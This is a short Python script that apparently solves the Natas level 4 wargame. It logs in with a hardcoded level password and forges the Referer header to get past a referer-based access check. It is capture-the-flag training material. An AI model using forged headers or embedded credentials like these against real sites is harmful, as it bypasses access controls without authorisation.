#!/usr/bin/env python

import requests
import re

username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

url = 'http://%s.natas.labs.overthewire.org/' % username

headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}

response = requests.get(url, auth = (username, password), headers = headers)
content = response.text

print(content)
#print(re.findall('<!--The password for natas3 is (.*) -->', content))